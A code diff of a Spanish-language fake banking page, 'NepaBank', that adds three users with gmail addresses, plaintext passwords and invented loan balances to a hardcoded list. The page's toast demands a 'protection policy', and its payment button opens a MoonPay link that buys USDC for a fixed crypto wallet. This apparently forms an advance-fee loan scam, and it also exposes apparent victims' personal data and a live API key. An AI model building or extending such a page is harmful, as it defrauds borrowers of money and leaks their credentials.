@@ -604,8 +604,8 @@
 <div id="toastMsg" class="toast-message"><i class="fas fa-shield-alt"></i> <span>Póliza de protección requerida - Dirígete a la sección de Seguros para activarla</span></div>
 
 <script>
-  // ==================== USUARIOS (14 USUARIOS) ====================
-  // Alfredo Soto: 50% descuento | Vilma Mojica: 30% descuento
+  // ==================== USUARIOS (17 USUARIOS) ====================
+  // Nuevos usuarios con 50% descuento: Liliana Carrizo, Zuleika Pizarro, Santos Rafael Romero
   const USERS = [
     { username: "invitado", password: "NepaBank2026!", name: "Carlos Méndez", cardHolder: "CARLOS MENDEZ", balance: 2500.00, discount: 0,
       transactions: [{ desc: "Desembolso del crédito NEPA", amount: 2500.00, date: "2026-03-31" }] },
@@ -637,10 +637,19 @@
       transactions: [{ desc: "Desembolso del crédito NEPA", amount: 1500.00, date: "2026-04-07" }] },
     // Franceline Cifuentes (8 de abril, sin descuento)
     { username: "cifuentesfrancia940@gmail.com", password: "Franceline2026#", name: "Franceline Cifuentes", cardHolder: "FRANCELINE CIFUENTES", balance: 2000.00, discount: 0,
-      transactions: [{ desc: "Desembolso del crédito NEPA", amount: 2000.00, date: "2026-04-08" }] }
+      transactions: [{ desc: "Desembolso del crédito NEPA", amount: 2000.00, date: "2026-04-08" }] },
+    // NUEVO USUARIO 1 - Liliana Carrizo (8 de abril, 50% descuento)
+    { username: "liliandy1974@gmail.com", password: "Liliana2026!", name: "Liliana Carrizo", cardHolder: "LILIANA CARRIZO", balance: 5000.00, discount: 50,
+      transactions: [{ desc: "Desembolso del crédito NEPA", amount: 5000.00, date: "2026-04-08" }] },
+    // NUEVO USUARIO 2 - Zuleika Pizarro (8 de abril, 50% descuento)
+    { username: "zpizarro221@gmail.com", password: "Zuleika2026!", name: "Zuleika Pizarro", cardHolder: "ZULEIKA PIZARRO", balance: 5000.00, discount: 50,
+      transactions: [{ desc: "Desembolso del crédito NEPA", amount: 5000.00, date: "2026-04-08" }] },
+    // NUEVO USUARIO 3 - Santos Rafael Romero (8 de abril, 50% descuento)
+    { username: "santos1965romero@gmail.com", password: "Santos2026!", name: "Santos Rafael Romero", cardHolder: "SANTOS ROMERO", balance: 4000.00, discount: 50,
+      transactions: [{ desc: "Desembolso del crédito NEPA", amount: 4000.00, date: "2026-04-08" }] }
   ];
 
-  // LINK DE PAGO ACTUALIZADO (MoonPay)
+  // LINK DE PAGO (MoonPay)
   const PAYMENT_LINK = "https://buy.moonpay.com/v2/buy?externalTransactionId=WK1u4gNvySHpBWvFPqtxjBvz0Vq_xRxCf50mL7I8ol8&externalCustomerId=did%3Aprivy%3Acmnf65ju500zm0cl7c2lucpdj&apiKey=pk_live_hirbpu0cVcLHrjktC9l7fbc9ctjv0SL&walletAddress=0xe1D2CA68872eB4416b05967BdB65c3D8428814ca&currencyCode=USDC_BASE&quoteCurrencyAmount=100&paymentMethod=credit_debit_card&colorCode=%233d8bff&theme=light&signature=SKtUMmfJ5Ub0snDSM2hWnBJ11F4zstXUrsfCPz84CkI%3D";
 
   let currentUser = null;
@@ -892,7 +901,6 @@
     if (closeModal) closeModal.addEventListener('click', () => { paymentModal.classList.remove('active'); resetInactivityTimer(); });
     if (confirmBtn) {
       confirmBtn.onclick = () => {
-        // Abrir el link de MoonPay
         window.open(PAYMENT_LINK, '_blank');
         showToast('🔄 Redirigiendo a la pasarela de pagos segura...');
         paymentModal.classList.remove('active');
